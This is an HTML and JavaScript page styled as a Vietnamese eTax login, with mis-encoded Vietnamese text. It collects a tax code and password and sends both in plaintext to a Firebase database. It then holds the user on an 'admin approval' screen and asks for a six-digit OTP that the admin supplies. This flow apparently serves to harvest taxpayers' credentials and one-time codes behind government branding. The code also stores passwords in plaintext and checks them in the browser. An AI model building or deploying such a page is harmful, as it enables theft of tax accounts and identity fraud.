<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üîê ƒêƒÇNG NH·∫¨P ETAX - OTP SYSTEM</title>
  
  <!-- Firebase CDN -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Tahoma', 'Microsoft Sans Serif', 'Arial', sans-serif;
    }

    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .login-container {
      background: white;
      border-radius: 20px;
      padding: 40px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .login-container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #b71c1c, #dc3545, #ffc107);
    }

    .etax-logo {
      width: 80px;
      height: 80px;
      background: linear-gradient(45deg, #b71c1c, #dc3545);
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      color: white;
      font-size: 32px;
      font-weight: bold;
    }

    .login-title {
      font-size: 24px;
      font-weight: 700;
      color: #333;
      margin-bottom: 10px;
    }

    .login-subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }

    .form-step {
      display: none;
    }

    .form-step.active {
      display: block;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #333;
      font-size: 14px;
    }

    .form-input {
      width: 100%;
      padding: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      font-size: 16px;
      transition: all 0.3s;
      box-sizing: border-box;
    }

    .form-input:focus {
      outline: none;
      border-color: #b71c1c;
      box-shadow: 0 0 0 3px rgba(183, 28, 28, 0.1);
    }

    .login-btn {
      width: 100%;
      background: linear-gradient(135deg, #b71c1c 0%, #dc3545 100%);
      color: white;
      border: none;
      padding: 15px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      margin-bottom: 15px;
    }

    .login-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(183, 28, 28, 0.3);
    }

    .login-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
      transform: none;
    }

    .secondary-btn {
      background: #6c757d;
      margin-top: 10px;
    }

    .secondary-btn:hover {
      background: #5a6268;
      box-shadow: 0 8px 25px rgba(108, 117, 125, 0.3);
    }

    .error-msg, .success-msg, .info-msg {
      padding: 12px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: 14px;
      display: none;
    }

    .error-msg {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .success-msg {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .info-msg {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }

    .otp-input-group {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin: 20px 0;
    }

    .otp-digit {
      width: 50px;
      height: 50px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      transition: all 0.3s;
    }

    .otp-digit:focus {
      border-color: #b71c1c;
      box-shadow: 0 0 0 3px rgba(183, 28, 28, 0.1);
    }

    .progress-steps {
      display: flex;
      justify-content: center;
      margin-bottom: 30px;
      gap: 15px;
    }

    .step {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #e0e0e0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      color: #666;
      font-size: 12px;
      transition: all 0.3s;
    }

    .step.active {
      background: #b71c1c;
      color: white;
    }

    .step.completed {
      background: #28a745;
      color: white;
    }

    .waiting-for-admin {
      text-align: center;
      padding: 20px;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #b71c1c;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .user-info {
      background: #f8f9fa;
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
      text-align: left;
    }

    .user-info h4 {
      color: #b71c1c;
      margin-bottom: 10px;
    }

    .user-info p {
      margin: 5px 0;
      font-size: 14px;
      color: #333;
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 30px 20px;
      }
      
      .otp-digit {
        width: 40px;
        height: 40px;
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="etax-logo">üèõÔ∏è</div>
    
    <!-- Progress Steps -->
    <div class="progress-steps">
      <div class="step active" id="step1">1</div>
      <div class="step" id="step2">2</div>
      <div class="step" id="step3">3</div>
    </div>
    
    <!-- Step 1: MST + Password -->
    <div class="form-step active" id="loginStep">
      <h1 class="login-title">üîê ƒêƒÇNG NH·∫¨P ETAX</h1>
      <p class="login-subtitle">Nh·∫≠p th√¥ng tin ƒë·ªÉ truy c·∫≠p h·ªá th·ªëng</p>
      
      <form onsubmit="userLogin(event)">
        <div class="form-group">
          <label class="form-label">üìã M√£ s·ªë thu·∫ø (MST):</label>
          <input type="text" class="form-input" id="userMST" 
                 placeholder="VD: 001095026798" 
                 pattern="[0-9]{10,13}" 
                 required>
        </div>
        
        <div class="form-group">
          <label class="form-label">üîë M·∫≠t kh·∫©u:</label>
          <input type="password" class="form-input" id="userPassword" 
                 placeholder="Nh·∫≠p m·∫≠t kh·∫©u" 
                 required>
        </div>
        
        <button type="submit" class="login-btn" id="loginBtn">
          üöÄ ƒêƒÉng nh·∫≠p
        </button>
      </form>
      
      <div class="error-msg" id="loginError"></div>
      <div class="success-msg" id="loginSuccess"></div>
      <div class="info-msg" id="loginInfo"></div>
    </div>
    
    <!-- Step 2: Waiting for Admin -->
    <div class="form-step" id="waitingStep">
      <h1 class="login-title">‚è≥ CH·ªú ADMIN DUY·ªÜT</h1>
      <p class="login-subtitle">Y√™u c·∫ßu ƒëƒÉng nh·∫≠p ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn admin</p>
      
      <div class="waiting-for-admin">
        <div class="spinner"></div>
        <p style="color: #666; margin-bottom: 20px;">
          Admin ƒëang xem x√©t y√™u c·∫ßu c·ªßa b·∫°n...
        </p>
        
        <div class="user-info" id="pendingUserInfo"></div>
        
        <button class="login-btn secondary-btn" onclick="checkApprovalStatus()">
          üîÑ Ki·ªÉm tra tr·∫°ng th√°i
        </button>
        
        <button class="login-btn secondary-btn" onclick="cancelRequest()">
          ‚ùå H·ªßy y√™u c·∫ßu
        </button>
      </div>
    </div>
    
    <!-- Step 3: OTP Input -->
    <div class="form-step" id="otpStep">
      <h1 class="login-title">üì± NH·∫¨P M√É OTP</h1>
      <p class="login-subtitle">Admin ƒë√£ g·ª≠i m√£ OTP cho b·∫°n</p>
      
      <div class="user-info" id="approvedUserInfo"></div>
      
      <p style="color: #666; margin: 20px 0; font-size: 14px;">
        Nh·∫≠p m√£ OTP 6 s·ªë:
      </p>
      
      <div class="otp-input-group">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 1)">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 2)">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 3)">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 4)">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 5)">
        <input type="text" class="otp-digit" maxlength="1" oninput="moveToNext(this, 6)">
      </div>
      
      <button class="login-btn" onclick="verifyOTP()">
        ‚úÖ X√°c nh·∫≠n OTP
      </button>
      
      <button class="login-btn secondary-btn" onclick="requestNewOTP()">
        üîÑ Y√™u c·∫ßu OTP m·ªõi
      </button>
      
      <div class="error-msg" id="otpError"></div>
      <div class="success-msg" id="otpSuccess"></div>
    </div>
  </div>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyD_rJgBFgBulheVenQUE2KXr4PBpSpTCxw",
      authDomain: "etax-7fbf8.firebaseapp.com",
      databaseURL: "https://etax-7fbf8-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "etax-7fbf8",
      storageBucket: "etax-7fbf8.appspot.com",
      messagingSenderId: "1030026724634",
      appId: "1:1030026724634:web:d76f5f9dad43bad6fd58a3",
      measurementId: "G-YS5DLECJE6"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let currentUser = null;
    let requestId = null;

    // üîê User login
    async function userLogin(event) {
      event.preventDefault();
      
      const mst = document.getElementById('userMST').value.trim();
      const password = document.getElementById('userPassword').value.trim();
      
      if (!mst || !password) {
        showMessage('loginError', '‚ùå Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
        return;
      }
      
      try {
        // Ki·ªÉm tra user ƒë√£ t·ªìn t·∫°i ch∆∞a
        const userSnapshot = await db.ref('users/' + mst).once('value');
        
        if (userSnapshot.exists()) {
          const userData = userSnapshot.val();
          
          if (userData.password !== password) {
            showMessage('loginError', '‚ùå M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng!');
            return;
          }
          
          if (userData.status === 'active') {
            // User ƒë√£ ƒë∆∞·ª£c duy·ªát, cho v√†o lu√¥n
            showMessage('loginSuccess', '‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng!');
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 1500);
            return;
          }
          
          if (userData.status === 'blocked') {
            showMessage('loginError', '‚ùå T√†i kho·∫£n ƒë√£ b·ªã kh√≥a!');
            return;
          }
        }
        
        // User m·ªõi ho·∫∑c ch∆∞a ƒë∆∞·ª£c duy·ªát
        currentUser = { mst, password };
        await sendAdminRequest(mst, password);
        
      } catch (error) {
        console.error('Login error:', error);
        showMessage('loginError', '‚ùå C√≥ l·ªói x·∫£y ra khi ƒëƒÉng nh·∫≠p!');
      }
    }

    // üìß G·ª≠i y√™u c·∫ßu ƒë·∫øn admin
    async function sendAdminRequest(mst, password) {
      try {
        const requestData = {
          mst: mst,
          password: password,
          requestTime: Date.now(),
          status: 'pending',
          userAgent: navigator.userAgent,
          ip: 'unknown'
        };
        
        // T·∫°o request trong Firebase
        const requestRef = await db.ref('userRequests').push(requestData);
        requestId = requestRef.key;
        
        // C·∫≠p nh·∫≠t user info
        document.getElementById('pendingUserInfo').innerHTML = `
          <h4>üìã Th√¥ng tin y√™u c·∫ßu:</h4>
          <p><strong>MST:</strong> ${mst}</p>
          <p><strong>Th·ªùi gian:</strong> ${new Date().toLocaleString('vi-VN')}</p>
          <p><strong>ID y√™u c·∫ßu:</strong> ${requestId}</p>
        `;
        
        // Chuy·ªÉn sang step ch·ªù admin
        showStep('waitingStep');
        setStepActive(2);
        
        // B·∫Øt ƒë·∫ßu polling tr·∫°ng th√°i
        startPolling();
        
      } catch (error) {
        console.error('Request error:', error);
        showMessage('loginError', '‚ùå Kh√¥ng th·ªÉ g·ª≠i y√™u c·∫ßu ƒë·∫øn admin!');
      }
    }

    // üîÑ Polling tr·∫°ng th√°i t·ª´ admin
    function startPolling() {
      const pollInterval = setInterval(async () => {
        try {
          const snapshot = await db.ref('userRequests/' + requestId).once('value');
          const request = snapshot.val();
          
          if (!request) {
            clearInterval(pollInterval);
            showMessage('loginError', '‚ùå Y√™u c·∫ßu kh√¥ng t·ªìn t·∫°i!');
            showStep('loginStep');
            setStepActive(1);
            return;
          }
          
          if (request.status === 'approved') {
            clearInterval(pollInterval);
            
            // Hi·ªÉn th·ªã th√¥ng tin OTP
            document.getElementById('approvedUserInfo').innerHTML = `
              <h4>‚úÖ Y√™u c·∫ßu ƒë√£ ƒë∆∞·ª£c duy·ªát!</h4>
              <p><strong>MST:</strong> ${request.mst}</p>
              <p><strong>Duy·ªát l√∫c:</strong> ${new Date(request.approvedTime).toLocaleString('vi-VN')}</p>
              <p><strong>OTP:</strong> ƒê√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn b·∫°n</p>
            `;
            
            showStep('otpStep');
            setStepActive(3);
          }
          
          if (request.status === 'rejected') {
            clearInterval(pollInterval);
            showMessage('loginError', '‚ùå Y√™u c·∫ßu ƒë√£ b·ªã t·ª´ ch·ªëi b·ªüi admin!');
            showStep('loginStep');
            setStepActive(1);
          }
          
        } catch (error) {
          console.error('Polling error:', error);
        }
      }, 3000); // Check m·ªói 3 gi√¢y
    }

    // ‚úÖ X√°c nh·∫≠n OTP
    async function verifyOTP() {
      const otpDigits = document.querySelectorAll('.otp-digit');
      const otp = Array.from(otpDigits).map(input => input.value).join('');
      
      if (otp.length !== 6) {
        showMessage('otpError', '‚ùå Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß 6 s·ªë OTP!');
        return;
      }
      
      try {
        const snapshot = await db.ref('userRequests/' + requestId).once('value');
        const request = snapshot.val();
        
        if (request.otp !== otp) {
          showMessage('otpError', '‚ùå M√£ OTP kh√¥ng ƒë√∫ng!');
          return;
        }
        
        // OTP ƒë√∫ng, t·∫°o user v√† cho v√†o
        await db.ref('users/' + currentUser.mst).set({
          mst: currentUser.mst,
          password: currentUser.password,
          status: 'active',
          createdAt: Date.now(),
          lastLogin: Date.now()
        });
        
        // X√≥a request
        await db.ref('userRequests/' + requestId).remove();
        
        showMessage('otpSuccess', '‚úÖ X√°c nh·∫≠n th√†nh c√¥ng! ƒêang chuy·ªÉn h∆∞·ªõng...');
        
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);
        
      } catch (error) {
        console.error('OTP verification error:', error);
        showMessage('otpError', '‚ùå C√≥ l·ªói x·∫£y ra khi x√°c nh·∫≠n OTP!');
      }
    }

    // üîÑ Y√™u c·∫ßu OTP m·ªõi
    async function requestNewOTP() {
      try {
        await db.ref('userRequests/' + requestId + '/requestNewOTP').set(Date.now());
        showMessage('otpSuccess', 'üîÑ ƒê√£ y√™u c·∫ßu OTP m·ªõi. Vui l√≤ng ƒë·ª£i admin g·ª≠i...');
      } catch (error) {
        console.error('Request new OTP error:', error);
        showMessage('otpError', '‚ùå Kh√¥ng th·ªÉ y√™u c·∫ßu OTP m·ªõi!');
      }
    }

    // ‚ùå H·ªßy y√™u c·∫ßu
    async function cancelRequest() {
      if (confirm('B·∫°n c√≥ ch·∫Øc mu·ªën h·ªßy y√™u c·∫ßu ƒëƒÉng nh·∫≠p?')) {
        try {
          if (requestId) {
            await db.ref('userRequests/' + requestId).remove();
          }
          showStep('loginStep');
          setStepActive(1);
        } catch (error) {
          console.error('Cancel request error:', error);
        }
      }
    }

    // üîÑ Ki·ªÉm tra tr·∫°ng th√°i
    function checkApprovalStatus() {
      showMessage('loginInfo', 'üîÑ ƒêang ki·ªÉm tra tr·∫°ng th√°i...');
    }

    // üéØ Helper functions
    function showStep(stepId) {
      document.querySelectorAll('.form-step').forEach(step => {
        step.classList.remove('active');
      });
      document.getElementById(stepId).classList.add('active');
    }

    function setStepActive(stepNumber) {
      document.querySelectorAll('.step').forEach((step, index) => {
        step.classList.remove('active', 'completed');
        if (index + 1 < stepNumber) {
          step.classList.add('completed');
        } else if (index + 1 === stepNumber) {
          step.classList.add('active');
        }
      });
    }

    function showMessage(elementId, message) {
      // Hide all messages
      document.querySelectorAll('.error-msg, .success-msg, .info-msg').forEach(el => {
        el.style.display = 'none';
      });
      
      // Show specific message
      const element = document.getElementById(elementId);
      element.textContent = message;
      element.style.display = 'block';
      
      // Auto hide after 5 seconds
      setTimeout(() => {
        element.style.display = 'none';
      }, 5000);
    }

    function moveToNext(current, position) {
      if (current.value.length === 1 && position < 6) {
        const nextInput = document.querySelectorAll('.otp-digit')[position];
        nextInput.focus();
      }
    }

    // Auto-check on page load n·∫øu c√≥ session
    window.onload = function() {
      // TODO: Check existing session
      console.log('üîê User OTP System loaded');
    };
  </script>
</body>
</html>